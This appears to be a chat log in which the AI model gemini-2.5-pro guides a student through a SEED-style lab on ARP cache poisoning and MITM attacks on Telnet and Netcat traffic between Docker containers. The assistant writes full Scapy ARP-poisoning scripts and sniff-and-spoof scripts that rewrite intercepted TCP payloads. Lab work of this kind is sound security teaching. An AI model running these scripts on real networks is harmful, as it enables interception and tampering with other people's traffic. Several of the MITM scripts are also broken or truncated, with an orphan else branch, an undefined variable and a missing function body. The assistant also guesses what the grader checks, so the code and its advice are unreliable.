*   **Why it's blocking Scenario 2:** Since the cache was empty for `10.9.0.6`, the gratuitous ARP packet you sent was considered "unsolicited" from Host A's perspective for creating a *new* entry. Because `arp_accept` was 0, Host A simply ignored it, even though Wireshark shows it received the packet correctly.

**Solution for the Lab:**

To make Scenario 2 work for Task 1.C in this specific lab environment, you need to temporarily change this setting on Host A.

1.  **Inside the Host A container (`fc50e4e36736`):** Run the following command:
    ```bash
    sudo sysctl net.ipv4.conf.eth0.arp_accept=1
    ```
    *(Using `eth0` is slightly better than `all` as it's more specific)*

2.  **Re-run the Scenario 2 Test:**
    *   Make sure the cache entry for `10.9.0.6` is still clear on Host A (`arp -d 10.9.0.6` if needed, then `arp -n` to verify).
    *   Run the `task1c.py` script again on Host M (`sudo python3 task1c.py`).
    *   Check the cache on Host A (`arp -n`).

Now, with `arp_accept=1`, Host A should accept the gratuitous ARP packet and create the poisoned entry (`10.9.0.6` mapping to `02:42:0a:09:00:69`), even though the cache was initially empty.

Make sure Wireshark captures this successful attempt as well. This setting might reset if the container restarts, but it should persist long enough for you to complete the lab tasks.

### User

sudo command was not found


---

### Assistant (gemini-2.5-pro)

Ah, right! Looking back at your previous prompt (`root@fc50e4e36736:~#`), you are already logged in as the **root user** inside the Host A container.

When you are root, you don't need to (and often can't) use `sudo`. `sudo` is for regular users to temporarily elevate their privileges *to* root.

**Simply run the command without `sudo`:**

```bash
# Inside the Host A container (fc50e4e36736) where you are root
sysctl net.ipv4.conf.eth0.arp_accept=1
```

This should work directly since you already have root permissions. Then you can proceed with re-running the Scenario 2 test for Task 1.C.


---

### User

root@fc50e4e36736:~# sysctl net.ipv4.conf.eth0.arp_accept=1
sysctl: setting key "net.ipv4.conf.eth0.arp_accept": Read-only file system


---

### Assistant (gemini-2.5-pro)

Okay, the "Read-only file system" error when trying to modify `/proc/sys/net/ipv4/conf/eth0/arp_accept` is a common issue within Docker containers, even when running as root.

**Why this happens:**

*   **Security:** Docker containers, by default, run with security restrictions to prevent processes inside the container from making potentially harmful changes to the host system's kernel or settings shared across containers. The `/proc/sys` filesystem, which reflects kernel parameters, is often mounted read-only within the container for many parameters as a security measure.
*   **Kernel Namespacing:** While containers have isolated network namespaces, some kernel parameters are still shared or controlled by the host, and modifying them from within a standard container is disallowed.

**What to do for the lab:**

1.  **Acknowledge the Limitation:** You've correctly identified that Host A's configuration (`arp_accept = 0`) prevents it from accepting the gratuitous ARP into an empty cache (Scenario 2).
2.  **Document the Attempt:**
    *   Make sure you have run the `task1c.py` script for Scenario 2.
    *   **Crucially, ensure the corresponding Gratuitous ARP packet (sent from M, destination broadcast, claiming IP_B for MAC_M) *is present* in your Wireshark capture.** This proves you launched the attack correctly, even if the target didn't accept it due to its configuration.
    *   You already have the output showing `arp_accept = 0` and the read-only error, which explains *why* it didn't work on Host A.
3.  **Proceed to Task 2:** Since you cannot easily change this kernel parameter in the provided lab container, you should move on. The ARP poisoning methods that *did* work (like Task 1.A, and likely Task 1.C Scenario 1) are sufficient to set up the Man-in-the-Middle scenario for Task 2 and Task 3.

The autograder for the lab likely focuses on verifying that you *sent* the correct ARP packets (which will be visible in your `.pcap` file) rather than strictly requiring the victim's cache to be poisoned in *every single scenario*, especially when default OS security settings might interfere as they did here.

**In summary:** Don't worry about Scenario 2 of Task 1.C not poisoning the cache. Just make sure you ran the script, captured the *outgoing* gratuitous ARP packet in Wireshark, understand *why* it didn't work on Host A (`arp_accept=0`, read-only `/proc/sys`), and continue to Task 2 using an ARP poisoning method that was successful.

let's go to task 2 then. Q2 Task 2: MITM Attack on Telnet using ARP Cache Poisoning
0 Points
Grading comment:

Hosts A and B are communicating using Telnet, and Host M wants to intercept their communication, so it can make changes to the data sent between A and B. The setup is depicted in Figure 2.  We have already created an account called "seed" inside the container, the password is"dees".  You can Telnet into this account.

Step 1 (Launch the ARP cache poisoning attack). See text in the PDF file. 

Step 2 (Testing). Before doing this step, please make sure that the IP forwarding on Host M is turned off. You can do that with the following command: 

sysctl net.ipv4.ip_forward=0

After the ARP cache poisoning is successful, try to ping between Hosts A and B.

Step 3 (Turn on IP forwarding). Now we turn on the IP forwarding on Host M, so it will forward the packets between A and B. Please run the following command and repeat Step 2: 

sysctl net.ipv4.ip_forward=1

Step 4 (Launch the MITM attack). We are ready to make changes to the Telnet data between A and B. Assume that A is the Telnet client and B is the Telnet server. After A has connected to the Telnet server on B, for every key stroke typed in A’s Telnet window, a TCP packet is generated and sent to B. 

We would like to intercept the TCP packet, and replace a typed character with a fixed character.  In this case we want to replace 'Q' with 'Z'. If intercepted correctly, it should not matter if you type in 'Q', Telnet should always display Z. 

From the previous steps, we are able to redirect the TCP packets to Host M, but instead of forwarding them, we would like to replace them with a spoofed packet. We will write a sniff-and-spoof program to accomplish this goal. In particular, we would like to do the following:

    We first keep the IP forwarding on, so we can successfully create a Telnet connection between A to B. Once the connection is established, we turn off the IP forwarding using the following command: sysctl net.ipv4.ip_forward=0
    We run our sniff-and-spoof program on Host M, such that for the captured packets sent from A to B, we spoof a packet but with different data. For packets from B to A (Telnet response), we do not make any change, so the spoofed packet is exactly the same as the original one.

In Telnet, typically, every character we type in the Telnet window triggers an individual TCP packet, but if you type very fast, some characters may be sent together in the same packet. That is why in a typical Telnet packet from client to server, the payload only contains one character. The character sent to the server will be echoed back by the server, and the client will then display the character in its window. Therefore, what we see in the client window is not the direct result of the typing; whatever we type in the client window takes a round trip before it is displayed.  If the network is disconnected, whatever we typed on the client window will not displayed, until the network is recovered. Similarly, if attackers change the character to Z during the round trip, Z will be displayed at the Telnet client window, even though that is not what you have typed.

To help students get started, we provide a skeleton sniff-and-spoof program in the following.  The program capture all the TCP packets, and then for packets from A to B, it makes some changes (the modification part is not included, because that is part of the task). For packets from B to A, the program does not make any change.

from scapy.all import *

IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"
IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"

def spoof_pkt(pkt):
     if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
          # Create a new packet based on the captured one.
          # 1) We need to delete the checksum in the IP & TCP headers,
          #    because our modification will make them invalid.
          #    Scapy will recalculate them if these fields are missing.
          # 2) We also delete the original TCP payload.

          newpkt=IP(bytes(pkt[IP]))
          del(newpkt.chksum)
          del(newpkt[TCP].payload)
          del(newpkt[TCP].chksum)

################################################################      
          # Construct the new payload based on the old payload.
          # Students need to implement this part.

          if pkt[TCP].payload:
               data = pkt[TCP].payload.load # The original payload data
               newdata = data # No change is made in this sample code
               
               send(newpkt/newdata)
          else:
               send(newpkt)
################################################################
     elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
          # Create new packet based on the captured one
          # Do not make any change
          newpkt=IP(bytes(pkt[IP]))
          del(newpkt.chksum)
          del(newpkt[TCP].chksum)
          send(newpkt)

f=’tcp’
pkt = sniff(iface=’eth0’, filter=f, prn=spoof_pkt)

It should be noted that the code above captures all the TCP packets, including the one generated by the program itself. That is undesirable, as it will affect the performance. You will need to change the filter, so your code does not capture its own packets.

Note: For the pcap submission, you must type in a single 'Q'  - if you use any other letter or multiple Q's this will not show up in the autograder and it will not give you credit.

To complete this task, you will need the following in your Wireshark capture:

    Packet from A->M (with a 'Q')
    Packet from M->B (with a 'Z')
    Packet from B->M (with a 'Z')
    Packet from M->A (with a 'Z')

Question 2.1 Capture packets with Wireshark that shows your program changing the typed characters to all Z's.
Q2.1 Capture packets with Wireshark that shows your program changing the typed characters to all Z's.

Grading comment:

Ideally if the MITM Attack on Telnet using ARP cache poisoning is successful, you should be able to:

    display a terminal window with only Z's
    capture a Wireshark frame showing that A's (or whatever character) is sent to the Attacker
    capture a Wireshark frame showing that Z's are sent from the Attacker to Host B or Host B sending Z's to Host A

### Assistant (gemini-2.5-pro)

Alright, let's set up and execute the Man-in-the-Middle (MITM) attack on Telnet for Task 2.

**Goal:** Intercept Telnet traffic between Host A (client `10.9.0.5`) and Host B (server `10.9.0.6`) using Host M (`10.9.0.105`). Modify the traffic so that when 'Q' is typed on A, it appears as 'Z' on A's screen after being processed and echoed by B (via M).

**Phase 1: Setup and ARP Poisoning**

1.  **Ensure Wireshark is Capturing:** Keep your Wireshark capture running on the `br-xxxx` interface. If you stopped it, start it again. You need packets from Task 1, 2, and 3 in the final file.

2.  **ARP Poison Host A:** (Convince A that B's IP is at M's MAC)
    *   On **Host M**, run a script similar to `task1b.py` (ARP Reply) or `task1a.py` (ARP Request) targeting Host A. Let's use the ARP Reply method as an example. You might need to run this periodically if the cache expires quickly, but often running it once or twice is enough for the duration of the test.
    *   *Example command (using a modified task1b.py named `poison_a.py`):*
        ```bash
        # On Host M (7a593a72b7d6)
        # Make sure poison_a.py targets IP_A/MAC_A but claims IP_B is at MAC_M
        sudo python3 poison_a.py # Sends ARP Reply: (Sender IP=IP_B, Sender MAC=MAC_M) -> (Target IP=IP_A, Target MAC=MAC_A)
        ```
    *   Verify on Host A (`docker exec -it fc50e4e36736 bash` then `arp -n`) that `10.9.0.6` now maps to `02:42:0a:09:00:69`.

3.  **ARP Poison Host B:** (Convince B that A's IP is at M's MAC)
    *   On **Host M**, run a similar script, but this time targeting Host B.
    *   Create `poison_b.py` by modifying `task1b.py`: change `IP_A`/`MAC_A` to `IP_B`/`MAC_B` in the target fields (`hwdst`, `pdst`), and change the claimed IP `psrc` to `IP_A`. The source MACs (`hwsrc`, `ether.src`) remain `MAC_M`.
    *   *Example command:*
        ```bash
        # On Host M (7a593a72b7d6)
        # Make sure poison_b.py targets IP_B/MAC_B but claims IP_A is at MAC_M
        sudo python3 poison_b.py # Sends ARP Reply: (Sender IP=IP_A, Sender MAC=MAC_M) -> (Target IP=IP_B, Target MAC=MAC_B)
        ```
    *   Verify on Host B (`docker exec -it 51a2027240d3 bash` then `arp -n`) that `10.9.0.5` now maps to `02:42:0a:09:00:69`.

**Phase 2: Testing Forwarding**

4.  **Disable IP Forwarding on M:**
    ```bash
    # On Host M (7a593a72b7d6)
    sudo sysctl net.ipv4.ip_forward=0
    ```

5.  **Test Connectivity (Should Fail):**
    *   Try pinging B from A:
        ```bash
        # On Host A (fc50e4e36736)
        ping -c 3 10.9.0.6
        ```
    *   This ping should fail (timeout or destination unreachable) because Host M received the packets (due to ARP poisoning) but isn't forwarding them.

6.  **Enable IP Forwarding on M:**
    ```bash
    # On Host M (7a593a72b7d6)
    sudo sysctl net.ipv4.ip_forward=1
    ```

7.  **Test Connectivity (Should Succeed):**
    *   Try pinging B from A again:
        ```bash
        # On Host A (fc50e4e36736)
        ping -c 3 10.9.0.6
        ```
    *   This ping should now succeed because Host M is forwarding the packets between A and B.

**Phase 3: The MITM Attack**

8.  **Prepare the Sniff-and-Spoof Script:**
    *   On **Host M**, create a file named `mitm_telnet.py`.
    *   Paste the following code, which is based on the skeleton but includes the 'Q' to 'Z' replacement and uses `sendp` for more reliable L2 sending:

    ```python
    #!/usr/bin/env python3
    from scapy.all import *
    import sys # To flush output

    # Use values from settings.txt
    IP_A = "10.9.0.5"
    MAC_A = "02:42:0a:09:00:05"
    IP_B = "10.9.0.6"
    MAC_B = "02:42:0a:09:00:06"
    MAC_M = "02:42:0a:09:00:69" # Attacker MAC

    print("MITM Script Started...")
    sys.stdout.flush()

    def spoof_pkt(pkt):
        # Ensure it's an IP packet containing TCP
        if not (IP in pkt and TCP in pkt):
            return

        try:
            if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
                print("-> Processing packet from A to B", end='')
                sys.stdout.flush()
                # Create a new IP packet based on the captured one
                newpkt_ip = IP(bytes(pkt[IP]))
                del(newpkt_ip.chksum) # Delete IP checksum
                if TCP in newpkt_ip:
                    del(newpkt_ip[TCP].chksum) # Delete TCP checksum

                # Construct the new payload
                if pkt[TCP].payload:
                    data = pkt[TCP].payload.load # The original payload data
                    print(f" | Original data: {data.hex()}", end='')
                    # *** THE MODIFICATION ***
                    newdata = data.replace(b'Q', b'Z')

                else:
                    print(" | No TCP payload.", end='')
                    # Remove old payload if it existed but was empty? Safer to ensure it's gone.
                    if TCP in newpkt_ip and Raw in newpkt_ip[TCP]:
                       del(newpkt_ip[TCP].payload)
                    newpkt_L3 = newpkt_ip # Packet without payload

                # Create L2 frame and send
                newpkt_L2 = Ether(src=MAC_M, dst=MAC_B) / newpkt_L3
                sendp(newpkt_L2, iface='eth0', verbose=False)
                print(" | Sent M -> B")
                sys.stdout.flush()

            elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
                print("<- Processing packet from B to A", end='')
                sys.stdout.flush()

                else:
                    print(" | No TCP payload.", end='')
                    newpkt_L3 = newpkt_ip

                # Create L2 frame and send
                newpkt_L2 = Ether(src=MAC_M, dst=MAC_A) / newpkt_L3
                sendp(newpkt_L2, iface='eth0', verbose=False)
                print(" | Sent M -> A")
                sys.stdout.flush()

        except Exception as e:
            print(f"\nError processing packet: {e}")
            # pkt.show() # Uncomment for detailed packet info on error


    # Define the filter (more specific)
    f = f"tcp and port 23 and ((src host {IP_A} and dst host {IP_B}) or (src host {IP_B} and dst host {IP_A}))"
    print(f"Starting sniff on eth0 with filter: {f}")
    sys.stdout.flush()

    # Start sniffing
    pkt = sniff(iface="eth0", filter=f, prn=spoof_pkt, store=0)

    print("\nMITM Script Stopped.")
    ```

9.  **Establish Telnet Connection:**
    *   Make sure IP forwarding is still **ON** on Host M (`sudo sysctl net.ipv4.ip_forward=1`).
    *   On **Host A**, connect to Host B via Telnet:
        ```bash
        # On Host A (fc50e4e36736)
        telnet 10.9.0.6
        ```
    *   You should get a login prompt. Log in as `seed` with password `dees`. You should see the welcome message.

10. **Disable IP Forwarding (Crucial Step):**
    *   Now that the connection is established, **disable IP forwarding** on Host M so your script takes over packet handling:
        ```bash
        # On Host M (7a593a72b7d6)
        sudo sysctl net.ipv4.ip_forward=0
        ```

11. **Run the MITM Script:**
    *   On **Host M**, run the sniff-and-spoof script:
        ```bash
        # On Host M (7a593a72b7d6)
        sudo python3 mitm_telnet.py
        ```
    *   You should see the "MITM Script Started..." message and it will wait for packets.

12. **Test the Attack:**
    *   Go back to the **Host A** Telnet window (which is still connected).
    *   **Type a single uppercase 'Q' character.**
    *   **Observe:**
        *   On Host A's Telnet window, you should see a 'Z' appear (not the 'Q' you typed).
        *   On Host M's terminal where `mitm_telnet.py` is running, you should see output indicating it processed a packet from A->B (with original 'Q' data and modified 'Z' data) and then processed the echo packet from B->A (forwarding the 'Z').
        *   In Wireshark, you should see the four required packets:
            1.  A (`10.9.0.5`) -> M (`02:42:0a:09:00:69`) [TCP Payload: 'Q']
            2.  M (`02:42:0a:09:00:69`) -> B (`10.9.0.6`) [TCP Payload: 'Z']
            3.  B (`10.9.0.6`) -> M (`02:42:0a:09:00:69`) [TCP Payload: 'Z' (echo)]
            4.  M (`02:42:0a:09:00:69`) -> A (`10.9.0.5`) [TCP Payload: 'Z' (echo)]

13. **Stop the Attack:**
    *   Press `Ctrl+C` in the Host M terminal running the `mitm_telnet.py` script.
    *   You can close the Telnet session on Host A.

You have now completed Task 2. Ensure the relevant packets are in your Wireshark capture. Keep the capture running for Task 3.

### User

write poison_a and poison_b scritps


---

### Assistant (gemini-2.5-pro)

Okay, here are the two Python scripts using Scapy. Save these on Host M.

---

**`poison_a.py` (Poisons Host A's cache)**

This script sends an ARP reply to Host A (`10.9.0.5`), telling it that Host B's IP (`10.9.0.6`) is at Host M's MAC address (`02:42:0a:09:00:69`).

```python
#!/usr/bin/env python3

from scapy.all import Ether, ARP, sendp
import time

# Define the IP and MAC addresses based on your settings.txt
IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"
IP_B = "10.9.0.6"
MAC_M = "02:42:0a:09:00:69" # Attacker's MAC

print(f"--- Poisoning Host A ({IP_A}) ---")
print(f"Sending ARP Reply: {IP_B} is at {MAC_M}")

# Construct the Ethernet frame
# Source MAC is the attacker's MAC (MAC_M)
# Destination MAC is Host A's MAC (MAC_A)
ether = Ether(src=MAC_M, dst=MAC_A)

# Construct the ARP packet
# op=2 signifies an ARP Reply
# hwsrc = Sender MAC -> Attacker's MAC (MAC_M)
# psrc  = Sender IP  -> IP we want A to associate with MAC_M (IP_B)
# hwdst = Target MAC -> Victim's MAC (MAC_A)
# pdst  = Target IP  -> Victim's IP (IP_A)
arp = ARP(op=2, hwsrc=MAC_M, psrc=IP_B, hwdst=MAC_A, pdst=IP_A)

# Combine Ethernet and ARP layers
packet = ether/arp

# Send the packet at Layer 2
sendp(packet, iface="eth0", verbose=False)

print("Poisoning packet sent to Host A.")
print("------------------------------------")

```

---

**`poison_b.py` (Poisons Host B's cache)**

This script sends an ARP reply to Host B (`10.9.0.6`), telling it that Host A's IP (`10.9.0.5`) is at Host M's MAC address (`02:42:0a:09:00:69`).

```python
#!/usr/bin/env python3

from scapy.all import Ether, ARP, sendp
import time

# Define the IP and MAC addresses based on your settings.txt
IP_A = "10.9.0.5"
IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"
MAC_M = "02:42:0a:09:00:69" # Attacker's MAC

print(f"--- Poisoning Host B ({IP_B}) ---")
print(f"Sending ARP Reply: {IP_A} is at {MAC_M}")

# Construct the Ethernet frame
# Source MAC is the attacker's MAC (MAC_M)
# Destination MAC is Host B's MAC (MAC_B)
ether = Ether(src=MAC_M, dst=MAC_B)

# Construct the ARP packet
# op=2 signifies an ARP Reply
# hwsrc = Sender MAC -> Attacker's MAC (MAC_M)
# psrc  = Sender IP  -> IP we want B to associate with MAC_M (IP_A)
# hwdst = Target MAC -> Victim's MAC (MAC_B)
# pdst  = Target IP  -> Victim's IP (IP_B)
arp = ARP(op=2, hwsrc=MAC_M, psrc=IP_A, hwdst=MAC_B, pdst=IP_B)

# Combine Ethernet and ARP layers
packet = ether/arp

# Send the packet at Layer 2
sendp(packet, iface="eth0", verbose=False)

print("Poisoning packet sent to Host B.")
print("------------------------------------")

```

---

**How to use them for Task 2, Step 1:**

1.  Save the code above into `poison_a.py` and `poison_b.py` on Host M.
2.  Make them executable (optional but good practice): `chmod +x poison_a.py poison_b.py`
3.  Run them with `sudo` on Host M:
    ```bash
    sudo python3 poison_a.py
    sudo python3 poison_b.py
    ```
4.  Verify the ARP caches on Host A and Host B are poisoned as described in the previous steps. You might need to re-run these scripts occasionally if the ARP entries expire during your testing.

shouldnt we be running it in this interface?

![Screenshot 2025-04-16 at 9.28.45 PM.png](https://utfs.io/f/IN4OjmY4wMHBB4VC1D7MGXOBET37Fo51bwJmZPef29yQuqit)

---

### Assistant (gemini-2.5-pro)

You are absolutely right to bring that up, as it's a crucial point of potential confusion! Here's the distinction:

1.  **Wireshark Capture Interface (on Host Machine):** `br-407b98f0a521` is the **correct** interface to select **in Wireshark** when you are running Wireshark *on your main host machine* (where Docker is installed). This bridge interface is created by Docker to connect the containers (A, B, M) and allows Wireshark on the host to see the traffic flowing *between* them.

2.  **Scapy Script Interface (Inside Container M):** The Python scripts (`poison_a.py`, `poison_b.py`, `mitm_telnet.py`, etc.) are running **inside the Host M container** (`7a593a72b7d6`). From *within* that container, its connection to the Docker network bridge (`br-407b98f0a521`) typically appears as a standard Ethernet interface, almost always named **`eth0`**.

**Therefore:**

*   You capture on `br-407b98f0a521` in **Wireshark** (on your host).
*   You use `iface="eth0"` within the **Scapy scripts** (running inside Host M).

The scripts need to specify the interface name *as the operating system inside the container sees it*, which is `eth0`. They don't know about the `br-xxxx` interface name existing on the host machine outside the container.

So, keep `iface="eth0"` in your Python scripts. You are correctly capturing on `br-407b98f0a521` in Wireshark.

ok so, now that all the files are there, what is the step by step to get the attack to be successful

Okay, you have the scripts (`poison_a.py`, `poison_b.py`, `mitm_telnet.py`) ready on Host M, and you've seen the 'Q' packet in Wireshark, which means you've likely done some parts already. Let's put it all together in the correct sequence for a successful Task 2 MITM attack.

**Goal:** Type 'Q' in Telnet on Host A, see 'Z' appear, and capture the required packets in Wireshark.

**Prerequisites:**

*   You are logged into Host M (`7a593a72b7d6`).
*   The scripts `poison_a.py`, `poison_b.py`, and `mitm_telnet.py` are present on Host M.
*   Wireshark is running on your **host machine** (not inside a container) and actively capturing packets on the correct bridge interface (`br-407b98f0a521`).

**Step-by-Step Execution:**

1.  **Poison ARP Caches (on Host M):**
    *   Run the poisoning scripts to redirect traffic from A and B to M.
    ```bash
    # On Host M terminal
    sudo python3 poison_a.py
    sudo python3 poison_b.py
    ```
    *   *(Optional but recommended)* Quickly verify caches:
        *   Open a terminal to Host A (`docker exec -it fc50e4e36736 bash`) and run `arp -n`. Check if `10.9.0.6` maps to `02:42:0a:09:00:69`.
        *   Open a terminal to Host B (`docker exec -it 51a2027240d3 bash`) and run `arp -n`. Check if `10.9.0.5` maps to `02:42:0a:09:00:69`.
        *   If entries expire later, you might need to re-run the poison scripts.

2.  **Enable IP Forwarding (on Host M):**
    *   Allow Host M to initially forward packets so the Telnet connection can be established.
    ```bash
    # On Host M terminal
    sudo sysctl net.ipv4.ip_forward=1
    ```

3.  **Establish Telnet Connection (on Host A):**
    *   Go to the Host A terminal (or open one: `docker exec -it fc50e4e36736 bash`).
    *   Connect to Host B:
    ```bash
    # On Host A terminal
    telnet 10.9.0.6
    ```
    *   Log in when prompted:
        *   Username: `seed`
        *   Password: `dees`
    *   You should see the welcome message. The connection is now established *through* Host M (though M is just forwarding packets at this point).

4.  **Disable IP Forwarding (on Host M) - CRITICAL STEP:**
    *   Now that the connection is set up, stop Host M from automatically forwarding. This forces packets into your `mitm_telnet.py` script.
    ```bash
    # On Host M terminal
    sudo sysctl net.ipv4.ip_forward=0
    ```

5.  **Run the MITM Script (on Host M):**
    *   Start the interception script. It will now wait for Telnet packets.
    ```bash
    # On Host M terminal
    sudo python3 mitm_telnet.py
    ```
    *   You should see the "MITM Script Started..." message.

6.  **Trigger the Attack (on Host A):**
    *   Go back to the **Host A terminal** where the Telnet session is active.
    *   **Type a single uppercase 'Q'.**

7.  **Observe the Results:**
    *   **Host A Terminal:** You should see a 'Z' appear on the screen, *not* the 'Q' you typed.
    *   **Host M Terminal:** The `mitm_telnet.py` script should print output showing it processed a packet A->B (original 'Q', modified 'Z') and then the echo packet B->A (forwarding 'Z').
    *   **Wireshark:** Examine the packets captured around the time you typed 'Q'. You should find the sequence:
        1.  `10.9.0.5 -> 10.9.0.6` [TCP Telnet Data: 'Q'] (Ethernet Src: MAC_A, Dst: MAC_M) - *This is A sending to M*
        2.  `10.9.0.5 -> 10.9.0.6` [TCP Telnet Data: 'Z'] (Ethernet Src: MAC_M, Dst: MAC_B) - *This is M sending modified packet to B*
        3.  `10.9.0.6 -> 10.9.0.5` [TCP Telnet Data: 'Z'] (Ethernet Src: MAC_B, Dst: MAC_M) - *This is B echoing 'Z' back to M*
        4.  `10.9.0.6 -> 10.9.0.5` [TCP Telnet Data: 'Z'] (Ethernet Src: MAC_M, Dst: MAC_A) - *This is M forwarding the echo to A*

8.  **Stop the Attack:**
    *   Press `Ctrl+C` in the Host M terminal running `mitm_telnet.py`.
    *   You can now close the Telnet session on Host A.

If you see the 'Z' on Host A and find those four packets (or packets very similar, showing the Q->Z modification and forwarding) in Wireshark, Task 2 is successful. Keep Wireshark running for Task 3.

the telnet connection is established, and the fowarding works, in fact, i even logged in onto telnet and check poisoning: root@51a2027240d3:~# arp -n

but it seems tlike the MITM attack is not correctly replacing Q to Z

### Assistant (gemini-2.5-pro)

Okay, the ARP caches look perfectly poisoned, and the Telnet connection is established. This is good progress!

If typing 'Q' still results in 'Q' appearing (and not 'Z'), the problem most likely lies in one of these areas:

1.  **IP Forwarding State:** This is the **most common culprit**. Did you **definitely** disable IP forwarding on Host M (`sudo sysctl net.ipv4.ip_forward=0`) *after* logging into Telnet on Host A, but *before* typing the 'Q'? If forwarding is still on (`1`), the kernel handles the packet, bypassing your Scapy script entirely.
    *   **Verification:** On Host M, run `sysctl net.ipv4.ip_forward`. The output **must** be `net.ipv4.ip_forward = 0` when you type the 'Q'. If it's 1, run `sudo sysctl net.ipv4.ip_forward=0` again.

2.  **MITM Script Not Running or Erroring:**
    *   Is the `sudo python3 mitm_telnet.py` command actually running in a terminal on Host M when you type 'Q'?
    *   Are there any error messages printed by the script in the Host M terminal? Even small Python errors can stop it from processing packets.
    *   Does the script print the "-> Processing packet from A to B" line when you type 'Q'? If not, it's not even seeing the packet (could be a filter issue, though the one provided should work).

3.  **Scapy Filter Issue (Less Likely if Copied Correctly):**
    *   Double-check the filter string `f` in `mitm_telnet.py`. It should be something like:
        `f = f"tcp and port 23 and ((src host {IP_A} and dst host {IP_B}) or (src host {IP_B} and dst host {IP_A}))"`
    *   Ensure the IP addresses (`IP_A`, `IP_B`) used in the filter string match your actual setup (`10.9.0.5`, `10.9.0.6`).

4.  **Packet Modification Logic Error:**
    *   Look at the `mitm_telnet.py` script's output on Host M. When it processes the A->B packet, does it print the original data (should be hex for 'Q', which is `51`) and the modified data (should be hex for 'Z', which is `5a`)?
    *   Is it correctly deleting the old payload (`del(newpkt_ip[TCP].payload)`) before adding the `newdata`?
    *   Is `sendp()` being called correctly with the L2 frame (`Ether(...) / newpkt_L3`)?

**Troubleshooting Steps:**

1.  **Confirm `ip_forward = 0` on Host M** right before typing 'Q'.
2.  **Watch the Host M terminal** running `mitm_telnet.py` *while* you type 'Q' on Host A. Look for *any* output or errors.
3.  **Examine Wireshark:**
    *   Filter for `tcp.port == 23`.
    *   When you type 'Q', do you see the packet going from A's MAC to M's MAC? (Src=`02:42:0a:09:00:05`, Dst=`02:42:0a:09:00:69`). Does it contain 'Q'?
    *   Do you then see *any* packet leaving M's MAC towards B's MAC? (Src=`02:42:0a:09:00:69`, Dst=`02:42:0a:09:00:06`). What data does it contain? If this packet is missing or still contains 'Q', the script is failing to modify or send.

Start by rigorously checking the `ip_forward` status and the script's console output on Host M. That will likely reveal the issue.

ok it worked, let's move on to 3: Q3 Task 3: MITM Attack on Netcat using ARP Cache Poisoning
0 Points
Grading comment:

This task is similar to Task 2,  except that Hosts A and B are communicating using Netcat, instead of Telnet. Host M wants to intercept their communication, so it can make changes to the data sent between A and B. You can use the following commands to establish a Netcat TCP connection between A and B:

On Host B (server, IP address is 10.9.0.6), run the following:
# nc -lp 9090
On Host A (client), run the following:
# nc 10.9.0.6 9090

Once the connection is made, you can type messages on Host A. Each line of messages will be put into a TCP packet sent to Host B, which simply displays the message. Your task is to replace every occurrence of your student id in the message with a sequence of lowercase a’s. The length of the sequence should be the same as that of your student id, or you will mess up the TCP sequence number, and hence the entire TCP connection. You need to use your student id, so we know the work was done by you.
Question 3.1 Capture packets with Wireshark that show your program changing the typed characters to all a's.
Q3.1 Capture packets with Wireshark that show your program changing the typed characters to all a's.

Grading comment:

Ideally if the MITM Attack on NetCat using ARP cache poisoning is successful, you should be able to:

    see terminal window with all lowercase a's
    see a Wireshark frame showing that your student id is sent to the Attacker
    see a Wireshark frame showing a string of lowercase a's are sent from the Attacker to Host B

### Assistant (gemini-2.5-pro)

Excellent, Task 2 is complete! Let's move on to the final task, MITM on Netcat. This follows the same principles as Task 2 but targets a different application (Netcat on port 9090) and requires replacing your student ID string.

**Goal:** Intercept Netcat traffic between Host A (client `10.9.0.5`) and Host B (server `10.9.0.6` on port 9090). Modify the traffic so that when your student ID is typed on A, Host B receives a string of 'a's of the same length instead.

**Prerequisites:**

*   You are logged into Host M (`7a593a72b7d6`).
*   The poisoning scripts (`poison_a.py`, `poison_b.py`) are available.
*   Wireshark is running on your host machine and capturing on `br-407b98f0a521`.
*   You know your student ID (the value in the `payload=` field of your `settings.txt`).

**Phase 1: Setup and ARP Poisoning**

1.  **Ensure ARP Poisoning is Active:**
    *   Run the poisoning scripts again on Host M to be sure the caches on A and B are still poisoned (or haven't expired).
    ```bash
    # On Host M terminal
    sudo python3 poison_a.py
    sudo python3 poison_b.py
    ```
    *   *(Optional)* Verify ARP caches on A and B.

**Phase 2: Prepare the MITM Script for Netcat**

2.  **Create the Sniff-and-Spoof Script (`mitm_netcat.py`):**
    *   On **Host M**, create a file named `mitm_netcat.py`.
    *   Paste the following code. **Crucially, replace `"YOUR_STUDENT_ID_HERE"` with your actual student ID string.**

    ```python
    #!/usr/bin/env python3
    from scapy.all import *
    import sys # To flush output

    # --- IMPORTANT: REPLACE THIS WITH YOUR ACTUAL STUDENT ID ---
    student_id_str = "YOUR_STUDENT_ID_HERE"
    # --- IMPORTANT: REPLACE THIS WITH YOUR ACTUAL STUDENT ID ---

    # Convert student ID to bytes for replacement
    student_id_bytes = student_id_str.encode('utf-8')
    # Create replacement string of 'a's with the same length
    replacement_bytes = (b'a' * len(student_id_bytes))

    # Use values from settings.txt
    IP_A = "10.9.0.5"
    MAC_A = "02:42:0a:09:00:05"
    IP_B = "10.9.0.6"
    MAC_B = "02:42:0a:09:00:06"
    MAC_M = "02:42:0a:09:00:69" # Attacker MAC

    print("MITM Netcat Script Started...")
    print(f"Replacing '{student_id_str}' ({student_id_bytes.hex()}) with '{replacement_bytes.decode('utf-8')}' ({replacement_bytes.hex()})")
    sys.stdout.flush()

                    # Remove old payload if it existed but was empty? Safer to ensure it's gone.
                    if TCP in newpkt_ip and Raw in newpkt_ip[TCP]:
                       del(newpkt_ip[TCP].payload)
                    newpkt_L3 = newpkt_ip # Packet without payload

                # Create L2 frame and send

        except Exception as e:
            print(f"\nError processing packet: {e}")
            # pkt.show() # Uncomment for detailed packet info on error


    # Define the filter for Netcat port 9090
    f = f"tcp and port 9090 and ((src host {IP_A} and dst host {IP_B}) or (src host {IP_B} and dst host {IP_A}))"
    print(f"Starting sniff on eth0 with filter: {f}")
    sys.stdout.flush()

    # Start sniffing
    pkt = sniff(iface="eth0", filter=f, prn=spoof_pkt, store=0)

    print("\nMITM Netcat Script Stopped.")

    ```

**Phase 3: Execute the Attack**

